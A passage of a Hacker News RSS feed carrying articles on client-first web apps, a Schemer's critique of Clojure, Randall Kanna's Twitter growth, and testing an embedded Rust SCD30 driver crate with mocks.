<p><strong>8. Caching Issues.</strong> Often, you have subtle and pervasive changes on every page when a person is logged in vs out. (I should remark that “logging in” into a site itself is an artifact of “centralized” thinking, but I digress.) Their avatar might be rendered in various places. New links are shown that might not be available otherwise. And new information may be shown that access control and discovery suggestions determines they can see. If you render everything on the served, there is no way to cache most of the fragments of the page, because they are changing. If you render client-side, all this comes for free.</p>
<h2 id="next-steps">Next Steps for Web Developers</h2>
<p>So by now you may be convinced that “client-first” is a good design pattern and progressive enhancement can be implemented later, by “speeding up” the first render, and by making it available to “dumb” crawlers and user agents who don’t execute Javascript in 2020. Here is how that would actually look, in actionable terms:</p>
<p><strong>9. Preloading. </strong>Okay, now that you are rendering everything client-side, you can implement a mechanism to preload data from the server. Perhaps put all the JSON in one file and send it over on the first render. Which — remember — happens only when you use a Web Browser to visit a page directly, a very specific scenario. Every other request besides that, including subsequent requests from a web browser, don’t need this preload. It’s an extra flair you can add for that specific use case. So the preloaded data comes and your Javascript will already have it and will render the HTML synchronously and quickly.</p>
<p><strong>10. Static Site Generation. </strong>The most popular static site generators today are still pretty narrow in their use-case. They help with blogs and publishing, eg&nbsp;<a href="https://jekyllrb.com/">Jekyll</a>,&nbsp;<a href="https://gohugo.io/">Hugo</a>, etc. But if you already have a dynamic site, you can sort of transform it into a static site by having a server-side script request some (dynamically specified) set of pages and render them to some related static html documents, and then begin sending 301 redirects on the dynamic pages to permanently tell browsers to go to the static pages in the future. (Because rewriting all links in your site may be infeasible). This approach runs into problems I described in point 5 — so a naive approach would only work for publicly accessible pages …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/">https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/</a></em></p>]]>
            </description>
            <link>https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356391</guid>
            <pubDate>Fri, 05 Mar 2021 13:05:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure from a Schemer's Perspective]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 77 (<a href="https://news.ycombinator.com/item?id=26356367">thread link</a>) | @todsacerdoti
<br/>
March 5, 2021 | https://www.more-magic.net/posts/thoughts-on-clojure.html | <a href="https://web.archive.org/web/*/https://www.more-magic.net/posts/thoughts-on-clojure.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Recently I joined <a href="https://www.bevuta.com/">bevuta IT</a>, where I am now working on a big project written in <a href="https://www.clojure.org/">Clojure</a>.  I'm very fortunate to be working in a Lisp for my day job!</p>
<p>As I've mostly worked with Scheme and have used other Lisps here and there, I would like to share my perspective on the language.</p><a href="#overall-design">
<h2 id="overall-design">Overall design</h2></a>
<p>From a first view, it is pretty clear that Clojure has been designed from scratch by (mostly) one person who is experienced with Lisps and as a language designer.  It is quite clean and has <a href="https://download.clojure.org/papers/clojure-hopl-iv-final.pdf">a clear vision</a>. Most of the standard library has a very consistent API.  It's also nice that it's a <a href="http://www.nhplace.com/kent/Papers/Technical-Issues.html">Lisp-1</a>, which obviously appeals to me as a Schemer.</p>
<p>My favourite aspect of the language is that everything is designed with a functional-first mindset.  This means I can program in the same functional style as I tend to do in Scheme.  Actually, it's even more functional, because for example its maps (what would be hash tables in Scheme) are much less clunky to deal with.  In Scheme, SRFI-69 hash tables are quite imperative, with <tt>hash-table-set!</tt> and <tt>hash-table-update!</tt> being the ways to insert new entries, which of course mutate the existing object.  Similarly, vectors can easily be extended (on either end!) functionally.</p>
<p>The underlying design of Clojure's data structures must be different. It needs to efficiently support functional updates; you don't want to fully copy a hash table or vector whenever you add a new entry. I am not sure how efficient everything is, because the system I'm working on isn't in production yet.  A quick look <a href="https://github.com/clojure/clojure/blob/master/src/jvm/clojure/lang/PersistentArrayMap.java">at the code</a> implies that various data structures are used under the hood for what looks like one data structure in the language.  That's a lot of complexity!  I'm not sure that's a tradeoff I'd be happy to make.  It makes it harder to reason about performance.  You might just be using a completely different underlying data structure than expected, depending on which operations you've performed.</p><a href="#non-lispiness">
<h2 id="non-lispiness">(non) Lispiness</h2></a>
<p>To a seasoned Lisp or Scheme programmer, Clojure can appear positively <i>bizarre</i>.  For example, while there is a <tt>cons</tt> function, there are no cons cells, and <tt>car</tt> and <tt>cdr</tt> don't exist.  Instead, it has <tt>first</tt> and <tt>rest</tt>, which are definitely saner names for a language designed from scratch.  It has "persistent lists", which are immutable lists, but in most day to day programming you will not even be <b>using</b> lists, as weird as that sounds!</p><a href="#symbols-and-keywords">
<h3 id="symbols-and-keywords">Symbols and keywords</h3></a>
<p>One thing that really surprised me is that symbols are not interned. This means that two symbols which are constructed on the fly, or when read from the same REPL, are not identical (as in <tt>eq</tt> or <tt>eq?</tt>) to one another:</p>
<pre><tt>user&gt; <span>(<span>= 'foo 'foo</span>)</span>
true
user&gt; <span>(<span>identical? 'foo 'foo</span>)</span>
false</tt></pre>
<p>Keywords seem to fulfil most "symbolic programming" use cases.  For example, they're almost always used as "keys" in maps or when specifying options for functions.  Keywords <i>are</i> interned:</p>
<pre><tt>user&gt; <span>(<span>= <span>:foo</span> <span>:foo</span></span>)</span>
true
user&gt; <span>(<span>identical? <span>:foo</span> <span>:foo</span></span>)</span>
true</tt></pre>
<p>Code is still (mostly) expressed as lists of symbols, though.  When you're writing macros you'll deal with them a lot.  But in "regular" code you will deal more with keywords, maps and vectors than lists and symbols.</p><a href="#numeric-tower">
<h3 id="numeric-tower">Numeric tower</h3></a>
<p>A favorite gotcha of mine is that integers <a href="https://clojure.org/reference/data_structures#Numbers">are not automatically promoted to bignums</a> like in most Lisps that support bignums.  If you need bignums, you have to use special-purpose operators like <tt>+'</tt> and <tt>-'</tt>:</p>
<pre><tt>user&gt; <span>(<span>* <span>(<span>bit-shift-left 1 62</span>)</span> 2</span>)</span>
Execution error <span>(<span>ArithmeticException</span>)</span> at user/eval51159 <span>(<span>REPL:263</span>)</span>.
integer overflow
user&gt; <span>(<span>*' <span>(<span>bit-shift-left 1 62</span>)</span> 2</span>)</span>
9223372036854775808N

user&gt; <span>(<span>* <span>(<span>bit-shift-left 1 62</span>)</span> 2N</span>)</span> 9223372036854775808N
user&gt; <span>(<span>* 1N 1</span>)</span> 1N</tt></pre>
<p>This could lead to better performance at the cost of more headaches when dealing with the accidental large numbers in code that was not prepared for them.</p>
<p>What about rationals, you ask?  Well, those are just treated as "the unusual, slow case".  So even though they <i>do</i> normalize to regular integers when simplifying, operations on those always return BigInts:</p>
<pre><tt>user&gt; <span>(<span>+ 1/2 1/4</span>)</span>
3/4
user&gt; <span>(<span>+ 1/2 1/2</span>)</span>
1N
user&gt; <span>(<span>/ 1 2</span>)</span> 1/2
user&gt; <span>(<span>/ 4 2</span>)</span> 2</tt></pre>
<p>The sad part is, bitwise operators do not support bignums, <i>at all</i>:</p>
<pre><tt>user&gt; <span>(<span>bit-shift-right 9223372036854775808N 62</span>)</span>
Execution error <span>(<span>IllegalArgumentException</span>)</span> at user/eval51167 <span>(<span>REPL:273</span>)</span>.
bit operation not supported for: class clojure.lang.BigInt
user&gt; <span>(<span>bit-shift-right' 9223372036854775808N 62</span>)</span> Syntax error compiling at <span>(<span>*cider-repl test:localhost:46543<span>(<span>clj</span>)</span>*:276:7</span>)</span>.
Unable to resolve symbol: bit-shift-right' in this context</tt></pre>
<p>There's one benefit to all of this: if you know the types of something going into numeric operators, you will typically know the type that comes out, because there is no automatic coercion.  Like I mentioned, this may provide a performance benefit, but it also simplifies reasoning about types.  Unfortunately, this does not work as well as you would hope because division may change the type, depending on whether the result divides cleanly or not.</p><a href="#syntax">
<h3 id="syntax">Syntax</h3></a>
<p>For many Lispers, this is the elephant in the room.  Clojure certainly qualifies as a Lisp, but it is much heavier on syntax than most other Lisps.  Let's look at a small contrived example:</p>
<pre><tt><span>(<span><i><span>let</span></i> [foo-value <span>(<span>+ 1 2</span>)</span>
      bar-value <span>(<span>* 3 4</span>)</span>]
  {<span>:foo</span> foo-value
   <span>:bar</span> bar-value}</span>)</span></tt></pre>
<p>This is a <tt>let</tt> just like in Common Lisp or Scheme.  The bindings are put inside square brackets, which is literal syntax for <i>vectors</i>.  Inside this vector, key-value pairs are interleaved, like in a Common Lisp <a href="http://www.lispworks.com/documentation/lw50/CLHS/Body/26_glo_p.htm#property_list">property list</a>.</p>
<p>The lack of extra sets of "grouping" parentheses is a bit jarring at first, but you get used to it rather quickly.  I still mess up occasionally when I accidentally get an odd number of entries in a binding vector.  Now, the <tt>{:foo foo-value :bar bar-value</tt>} syntax is a <i>map</i>, which acts like a hash table (more on that below).</p>
<p>There doesn't seem to be a good rationale about why vectors are used instead of regular lists, though.  What I <i>do</i> really like is that all the binding forms (even function signatures!) support <a href="https://clojure.org/guides/destructuring">destructuring</a>.  The syntax for destructuring maps is a bit ugly, but having it available is super convenient.</p>
<p>What I regard as a design mistake is the fact that Clojure allows for optional commas in lists and function calls.  Commas are just whitespace to the reader.  For example:</p>
<pre><tt><span>(<span>= [1, 2, 3, 4] [1 2 3 4]</span>)</span> =&gt; true
<span>(<span>= '<span>(<span>1, 2, 3, 4</span>)</span> '<span>(<span>1 2 3 4</span>)</span></span>)</span> =&gt; true
<span>(<span>= {<span>:foo</span> 1, <span>:bar</span> 2, <span>:qux</span> 3} {<span>:foo</span> 1 <span>:bar</span> 2 <span>:qux</span> 3}</span>)</span> =&gt; true
<span>(<span>= <span>(<span>foo 1, 2, 3, 4</span>)</span> <span>(<span>foo 1 2 3 4</span>)</span></span>)</span> =&gt; true
<span>(<span>= [,,,,,,1,,,2,3,4,,,,,,] [1 2 3 4]</span>)</span> =&gt; true</tt></pre>
<p>Maybe this is to make up for removing the extra grouping parentheses in <tt>let</tt>, <tt>cond</tt> and map literal syntax?  With commas you can add back some clarity about which items belong together.  Rarely anybody uses commas in real code, though.  And since it's optional it doesn't make much sense.</p>
<p>This has an annoying ripple effect on quasiquotation.  Due to this decision, a different character has to be used for <tt>unquote</tt>, because the comma was already taken:</p>
<pre><tt>`<span>(<span>1 2 ~<span>(<span>+ 1 2</span>)</span></span>)</span> =&gt; <span>(<span>1 2 3</span>)</span>
`<span>(<span>1 2 ~@<span>(<span>list 3 4</span>)</span></span>)</span> =&gt; <span>(<span>1 2 3 4</span>)</span></tt></pre>
<p>This might seem like a small issue, but it is an unnecessary and stupid distraction.</p><a href="#minimalism">
<h2 id="minimalism">Minimalism</h2></a>
<p>One of the main reasons I enjoy Scheme so much is its goal of minimalism.  This is achieved through elegant building blocks.  This is embodied by the <a href="https://schemers.org/Documents/Standards/R5RS/HTML/r5rs-Z-H-3.html#%_chap_Temp_3">Prime Clingerism</a>:</p>
<pre><tt>  Programming languages should be designed not by piling feature on
  top of feature, but by removing the weaknesses and restrictions
  that make additional features appear necessary.</tt></pre>
<p>Let's check the size of the <tt>clojure.core</tt> library.  It clocks in at 640 identifiers (v1.10.1), which is a lot more than R5RS Scheme's 218 identifiers.  It's not an entirely fair comparison as Scheme without SRFI-1 or SRFI-43 or an FFI has much less functionality as well. Therefore, I think Clojure's core library is fairly small but not exactly an exercise in minimalism.</p>
<p>Clojure reduces its API size considerably by having a "<a href="https://clojure.org/reference/sequences">sequence</a> abstraction". This is similar to Common Lisp's sequences: you can call <tt>map</tt>, <tt>filter</tt> or <tt>length</tt> on any sequence-type object: lists, vectors, strings and even maps (which are treated as key/value pairs). However, it is less hacky than in Common Lisp because for example with <tt>map</tt> you don't need to specify which kind of sequence you want to get back.  I get the impression that in Common Lisp this abstraction is not very prominent or used often but in Clojure <i>everything</i> uses sequences.  What I also liked is that sequences can be <i>lazy</i>, which removes the need for special operators as well.</p>
<p>If you compare this to Scheme, you have special-purpose procedures for every concrete type: <tt>length</tt>, <tt>vector-length</tt>, <tt>string-length</tt> etc.  And there's no <tt>vector-map</tt> in the standard, so you need <a href="https://srfi.schemers.org/srfi-43/srfi-43.html#vector-map"><tt>vector-map</tt> from SRFI 43</a>.  Lazy lists are a <a href="https://srfi.schemers.org/srfi-41/srfi-41.html">separate type</a> with its own set of specialized operators.  And so on and so forth.  Using concrete types everywhere provides for less abstract and confusing code and the performance characteristics of an algorithm tend to be clearer, but it also leads to a massive growth in library size.</p>
<p>After a while I really started noticing mistakes that make additional features appear necessary: for example, there's a special macro called <tt>loop</tt> to make tail recursive calls.  This uses a keyword <tt>recur</tt> to call back into the loop.  In Scheme, you would do that with a named <tt>let</tt> where you can choose your own identifier to recur.  It's also not possible to nest such Clojure loops, because the identifier is hardcoded.  So, this called for adding <a href="https://archive.clojure.org/design-wiki/display/design/Named%2Bloops%2Bwith%2Brecur-to.html">another feature</a>, which is currently in proposal.  Speaking of <tt>recur</tt>, it is also used for tail recursive self-calls.  It relies on the programmer rather than the compiler to mark calls as tail recursive. I find this a bit of a cop-out, especially in a language that is so heavily functional.  Especially since this doesn't work for mutually tail-recursive functions.  The <a href="https://www.windley.com/archives/2008/11/tail_optimized_mutual_recursion_in_clojure.shtml">official way to do those</a> is even more of a crutch.</p>
<p>I find the special syntax for one-off lambdas <tt>#(foo %)</tt> just as misguided as <a href="https://srfi.schemers.org/srfi-26/srfi-26.html">SRFI 26</a> (<tt>cut</tt> and <tt>cute</tt>).  You often end up needing to tweak the code in such a way that you have …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.more-magic.net/posts/thoughts-on-clojure.html">https://www.more-magic.net/posts/thoughts-on-clojure.html</a></em></p>]]>
            </description>
            <link>https://www.more-magic.net/posts/thoughts-on-clojure.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356367</guid>
            <pubDate>Fri, 05 Mar 2021 13:01:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Randall Kanna 12X her Twitter following to 35k (Their Timeline #6)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26356122">thread link</a>) | @pohjie
<br/>
March 5, 2021 | https://theirtimeline.com/randall-kanna-1/ | <a href="https://web.archive.org/web/*/https://theirtimeline.com/randall-kanna-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <p>Randall Kanna <a href="https://www.indiehackers.com/post/i-grew-my-email-list-to-6000-and-twitter-following-from-300-to-35k-in-a-year-ama-37b1472fed?commentId=-MUX-KDn-CzzjI9WGv1W">recently posted an AMA on Indie Hackers</a> on how she grew her Twitter following from 300 in 2019 to 35k in 2020. As we are unable to extract the actual number of followers in each month, this issue will take a slightly different approach. We shall examine her tweets in the context of Daniel Vassallo's <a href="https://gumroad.com/dvassallo#PBkrO">Everyone can Build a Twitter Audience</a> course, and extract the key tweets that had the greatest engagement. Along the way, we will also see the projects Randall took on as her Twitter following grew. Let's dive right in.</p><p>🗓 December 16 2019: Establishing credibility. Being a published author under the O'Reilly brand definitely increased her credibility. However, this is not something you can get to in a single day, or even in 3 months. Randall has been a software engineer for the past 4 years before releasing her book.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">One of my biggest life goals was to be a published author before 30. I never thought I could do it. And now my first book is available on sale right in time for the holidays! <a href="https://t.co/QPVYu13JI0">https://t.co/QPVYu13JI0</a> <a href="https://t.co/xqF4bWLS58">pic.twitter.com/xqF4bWLS58</a></p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1206390773589008385?ref_src=twsrc%5Etfw">December 16, 2019</a></blockquote>

</figure><p>While you may not have the expertise to be the subject matter expert on a topic, one immediate step you can take is to identify skills you wish to develop, then learn in public. This is similar to <a href="https://www.scotthyoung.com/blog/myprojects/mit-challenge-2/">Scott Young's MIT Challenge</a>, which greatly raised his profile and made him an expert in the field of ultralearning projects.</p><p>Tweet engagement: 458 likes, 49 comments.</p><p>🗓 January 18 2020: It is interesting to note that Randall did not start any new thread at all in January. Instead, she spent her time replying to tweets and adding value to other people's audience. This tweet resonated with me- there's actionable advice in the tweet on a very specific domain. It's no surprise that this has the highest engagement among all of her replies in January.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Turn up the volume a LOT and take notes when you hear something you like. I used to hate audiobooks as I also read faster but it really helps you build focus long term. I can finish 3x what I used to read by combining print &amp; audio and my focus has improved greatly.</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1218214556897398785?ref_src=twsrc%5Etfw">January 17, 2020</a></blockquote>

</figure><p>Tweet engagement: 7 likes, 1 comment</p><p>🗓 February 19 2020: Providing differentiated value to your audience. We have all seen way too many 'so you want to learn to code' guides. But what I love about the copy is the phrasing 'with low risk to your financial future and time'. That is understanding her audience and the demand among adults who want to learn programming but are unable to afford the time needed by universities' modules.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Has anyone ever asked you how they can get into engineering and where they can start? Even 'if' they should? So many people reached out to me that I finally created a free guide. Share it with someone you know that's considering if coding is for them.<a href="https://t.co/UTm3bCpKh6">https://t.co/UTm3bCpKh6</a> <a href="https://t.co/wl4pCS9dfz">pic.twitter.com/wl4pCS9dfz</a></p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1229870377494437888?ref_src=twsrc%5Etfw">February 18, 2020</a></blockquote>

</figure><p>If you feel that the market you wish to target is already too saturated, a good way to approach it is to think about a very specific subset of your target audience that has different limitations, and work towards helping that subset.</p><p>Tweet engagement: 100 likes, 29 comments.</p><p>🗓 March 10 2020: Timely advice. Randall posted this thread while the pandemic was hitting the United States and many workplaces had to allow their employees to work remotely. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">As (almost) everyone in tech offices is officially going remote in San Francisco, here are a few tips I’ve learned as a remote dev!</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1237207920955158528?ref_src=twsrc%5Etfw">March 10, 2020</a></blockquote>

</figure><p>While it is almost fruitless to wait for a similar black swan event, it is important to notice trends and contribute your existing expertise when the occasion occurs. You want to ride the rising waves, not the dying tides.</p><p>For example, Yaro Bagriy launched <a href="https://newslettercrew.com/">Newsletter Crew</a> when he realised there was no podcast that specifically focused on newsletters. The steep ascent of Substack in the past year also meant that he was riding a rising tide and could capture on the momentum.</p><p>A quick note: Randall has wrote a new tweet (that was not a response to others) only 2-3 times a month thus far. That is to change-</p><p>Tweet engagement: 50 likes, 18 comments.</p><p>🗓 April 27 2020: April was the clear pivot month in which Randall was very active in putting out her own content. </p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>So far in my career I've worked as a front-end engineer, a full-stack engineer, a blockchain engineer and an iOS engineer. </p><p>Having a CS degree doesn't matter.</p></div>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1254491098296143872?ref_src=twsrc%5Etfw">April 26, 2020</a></blockquote>

</figure><p>This thread is an example of one that garnered a lot of engagement, with 2 reasons on hindsight:</p><ol><li>This tweet is very encouraging to people who are looking to break into tech but do not necessarily have the formal education for it. Given how popular technology jobs are right now, there is a similar desire for people to acquire tech skills.</li><li>It is divisive- many people interpreted it as a way of shitting on formal CS degree (which was not what Randall meant), but nonetheless it increased engagement as it invited discussion on the matter.</li></ol><p>Tweet engagement: 2k likes, 247 comments.</p><p>🗓 May 16 2020: Sell your specific knowledge. Every month or so, sit down and brainstorm specific knowledge that your audience can benefit from. This is especially true if most of your peers are too busy/focused on the actual job itself, but neglect how more junior people desire the knowledge. You don't necessarily need to be at the very top of your game, you just need to be one step ahead of people in something. In fact, I'm a firm believer that you have more to teach the person a step behind you than the one who is ten steps behind you.</p><p>Randall understands this principle extremely well, and has been putting out tons of specific advice.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I reviewed hundreds of resumes this month. Here are the common issues I found. Thread.</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1261484755708571650?ref_src=twsrc%5Etfw">May 16, 2020</a></blockquote>

</figure><p>Notice how helpful threads like this gain a huge amount of engagement, and are the main reason why her Twitter following ballooned during this period. 🎈</p><p>Tweet engagement: 3.3k likes, 784 comments.</p><p>🗓 May 21 2020: The power of curation. What I love about this tweet is not just how helpful it is, but also how attainable. You don't have to be an expert to curate- in fact, if you decided 3 months ago to start learning a new skill and have gone through a few courses, you can rank the courses and curate those that have been more helpful. This goes back to the idea of helping someone a step behind you.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Here’s a list of resources for developers who want to crush the technical interview.</p><p>Thread</p></div>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1263309093457944576?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p>Tweet engagement: 7.2k likes, 2k comments.</p><p>🗓 June 20 2020: Wow this tweet blew up! 🥳 (It has 20.7k likes at the point of me writing this.) Randall has been mostly targeting the developers/wanna-be developers audience. But this tweet was a little more general- targeting anyone who wishes to learn how to code.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I don’t have a CS degree so I've had to learn on my own. Thread on creating your own CS degree online.</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1274133745222615041?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>

</figure><p>This is pretty much the inversion of what we suggested just now- finding out which subset of your target audience is neglected and working to serve them. But serving your audience need not be mutually exclusive.</p><p>You can think of your potential audience as subsets of each other- perhaps it helps from time to time to jump from your smaller audience to write for a larger audience and see how it turns out. Likewise, if you feel that you are writing for too general an audience, you can always zoom in and cater to specific niches.</p><p>This concludes today's time capsule on how Randall Kanna grew her Twitter following. I highly recommend that you check out the threads- not only are they extremely helpful, they act as a benchmark that you can measure your own output by.</p><p>In our next issue, we are going to examine how Randall self-published her first book and made $30k, then spun off subsequent products such as a podcast and more books. If you will like to be the first to receive that issue, <a href="https://theirtimeline.com/">subscribe now</a>! For the price of a ☕️ a month, you gain access to <em>all 4 entrepreneurial espresso- </em>short issues that motivate and educate you in 5 minutes so that you can grow your own business as well! 📈</p><p>Keep building! 🔨</p>
                        <section>
                            <h2>Enjoying these posts? Subscribe for more</h2>
                            
                            <br>
                            
                        </section>
    </div>
        
</article>                            </main>
</div>
        </div></div>]]>
            </description>
            <link>https://theirtimeline.com/randall-kanna-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356122</guid>
            <pubDate>Fri, 05 Mar 2021 12:34:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing a Driver Crate]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26356116">thread link</a>) | @lukastyrychtr
<br/>
March 5, 2021 | https://ferrous-systems.com/blog/test-driver-crate/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/test-driver-crate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://ferrous-systems.com/images/nrf-dk-scd30.jpg" alt="Hardware setup for testing the SCD30 CO2 sensor: a nRF52840 DK development board is connected to a SCD30 sensor via four wires"></p>

<p>Welcome to the second post in our <a href="https://ferrous-systems.com/blog/tags/embedded-rust-testing/">"testing Embedded Rust"</a> series.
In this blog post we'll cover how to test a platform agnostic <em>driver crate</em>.</p>



<p>In the embedded Rust ecosystem, the term driver crate refers to a <em>generic</em> library that interfaces some external component (e.g. sensor, actuator) using a communication protocol like <a href="https://en.wikipedia.org/wiki/I%C2%B2C">I<sup>2</sup>C</a> or <a href="https://en.wikipedia.org/wiki/Serial_Peripheral_Interface">SPI</a>.
The key point here being <em>generic</em>: the library implementation does <em>not</em> contain the platform specific details of <em>how</em> to do I<sup>2</sup>C or SPI transactions – all those details are hidden behind a <em>trait</em> (Rust term for <em>interfaces</em>).
Because driver crates are generic they can be used on a variety of platforms ranging from embedded Linux to small microcontrollers.</p>

<p>Most <a href="https://github.com/rust-embedded/awesome-embedded-rust#driver-crates">driver crates in the crates.io ecosystem</a> are generic around the traits found in the <a href="https://crates.io/crates/embedded-hal"><code>embedded-hal</code></a> crate.
This crate covers interfaces commonly found on embedded devices like Serial (AKA UART), I<sup>2</sup>C and SPI.
To use a driver crate you'll need a Hardware Abstraction Layer (HAL) that implements the <code>embedded-hal</code> traits; <a href="https://github.com/rust-embedded/awesome-embedded-rust#hal-implementation-crates">you can find plenty of HALs for microcontrollers that implement these traits on crates.io</a>.
And if you're writing a HAL yourself, we covered <a href="https://ferrous-systems.com/blog/defmt-test-hal">how to test a HAL in one of our previous blog posts</a>.</p>

<h2 id="project-structure">Project structure</h2>

<p><strong>NOTE</strong>: <a href="https://github.com/knurling-rs/test-driver-crate-example">The full source code for the example covered here can be found on GitHub</a>.</p>

<p>As an example, let's say you are writing a driver crate for the <a href="https://www.sensirion.com/en/environmental-sensors/carbon-dioxide-sensors/carbon-dioxide-sensors-co2/">SCD30</a>, a carbon dioxide (CO<sub>2</sub>) sensor which, by the way, is one of the tasks in our <a href="https://github.com/knurling-rs/knurling-books">first knurling session about building an air quality sensor</a> (note: currently you can only access this content if you're a <a href="https://github.com/sponsors/knurling-rs">sponsor</a>. All knurling material goes public however, so we'll update this blog post once it does!)</p>

<p>For driver crates, we recommend the following folder structure:</p>

<div><pre><code><span>$</span> <span># instead of `exa` (Rust tool) you can use the `tree` command</span>
<span>$</span> <span># https://crates.io/crates/exa</span>
<span>
</span><span>$</span> exa <span>-a</span> <span>-I</span> <span>'.git*'</span> <span>-T</span>
<span>.
</span><span>├── Cargo.toml
├── src
│  └── lib.rs
└── target-tests
   ├── .cargo
   │  └── config.toml
   ├── Cargo.toml
   └── tests
      └── scd30.rs
</span></code></pre></div>
<p>The root package (<code>./Cargo.toml</code>) is the driver crate itself.
There's a second Cargo package in the <code>target-tests</code> folder; it will be used exclusively for testing.
<code>target-tests</code> will be configured for cross compilation using <code>config.toml</code> so do <em>not</em> put these two crates in a Cargo workspace (or you may run into <a href="https://github.com/rust-embedded/cortex-m-rt/issues/74">build issues</a> or <a href="https://github.com/rust-lang/cargo/issues/6571#issuecomment-455908476">Cargo bugs</a>).</p>

<h2 id="the-scd30-api">The <code>Scd30</code> API</h2>

<p>Let's start by looking at the driver crate.
The core of the API will be some generic struct.
The SCD30 sensor has an I<sup>2</sup>C interface so the struct will be generic around the I<sup>2</sup>C implementation.</p>

<div><pre><code><span>use</span> <span>embedded_hal</span><span>::</span><span>blocking</span><span>::</span><span>i2c</span><span>;</span>

<span>/// A SCD30 sensor on the I2C bus `I`</span>
<span>pub</span> <span>struct</span> <span>Scd30</span><span>&lt;</span><span>I</span><span>&gt;</span><span>(</span><span>I</span><span>)</span>
<span>where</span>
    <span>// ↓ embedded-hal traits</span>
    <span>I</span><span>:</span> <span>i2c</span><span>::</span><span>Read</span> <span>+</span> <span>i2c</span><span>::</span><span>Write</span><span>;</span>

<span>/// A driver error</span>
<span>pub</span> <span>enum</span> <span>Error</span><span>&lt;</span><span>E</span><span>&gt;</span> <span>{</span>
    <span>/// I2C bus error</span>
    <span>I2c</span><span>(</span><span>E</span><span>),</span>
    <span>/// CRC validation failed</span>
    <span>InvalidCrc</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>E</span><span>,</span> <span>I</span><span>&gt;</span> <span>Scd30</span><span>&lt;</span><span>I</span><span>&gt;</span>
<span>where</span>
    <span>I</span><span>:</span> <span>i2c</span><span>::</span><span>Read</span><span>&lt;</span><span>Error</span> <span>=</span> <span>E</span><span>&gt;</span> <span>+</span> <span>i2c</span><span>::</span><span>Write</span><span>&lt;</span><span>Error</span> <span>=</span> <span>E</span><span>&gt;</span><span>,</span>
<span>{</span>
    <span>/// Initializes the SCD30 driver</span>
    <span>/// This consumes the I2C bus `I`</span>
    <span>pub</span> <span>fn</span> <span>init</span><span>(</span><span>i2c</span><span>:</span> <span>I</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>// ..</span>
    <span>}</span>

    <span>/// Returns the firmware version reported by the SCD30</span>
    <span>pub</span> <span>fn</span> <span>get_firmware_version</span><span>(</span>
        <span>&amp;</span><span>mut</span> <span>self</span><span>,</span>
    <span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>[</span><span>u8</span><span>;</span> <span>2</span><span>],</span> <span>Error</span><span>&lt;</span><span>E</span><span>&gt;&gt;</span> <span>{</span>
        <span>// ..</span>
    <span>}</span>

    <span>// omitted methods to e.g. read CO2 levels</span>

    <span>/// Destroys this driver and releases the I2C bus `I`</span>
    <span>pub</span> <span>fn</span> <span>destroy</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>I</span> <span>{</span>
        <span>// ..</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<p>Because the API is generic you can compile this crate to Linux, Windows, macOS or to a microcontroller.
Having an I<sup>2</sup>C interface (<code>trait</code>) enables testing the crate on your PC without any embedded hardware at all – not even a SCD30 is needed for this!
How? Using a mock implementation to simulate the I<sup>2</sup>C bus.</p>

<h2 id="host-testing-with-mocks">Host testing with mocks</h2>

<p>The idea goes like this: you instantiate the driver with an I<sup>2</sup>C <em>mock</em> implementation that can run on your PC without extra hardware.
Thankfully, there's already a solution for this in the crates.io ecosystem: the <a href="https://crates.io/crates/embedded-hal-mock/0.7.2"><code>embedded-hal-mock</code></a> crate.
As its name suggests, this crate contains mock implementations for several of the <code>embedded-hal</code> traits.
In this example, we'll use the <code>i2c::Mock</code> implementation.</p>

<p>Let's say we want to test the <code>get_firmware_version</code> function.
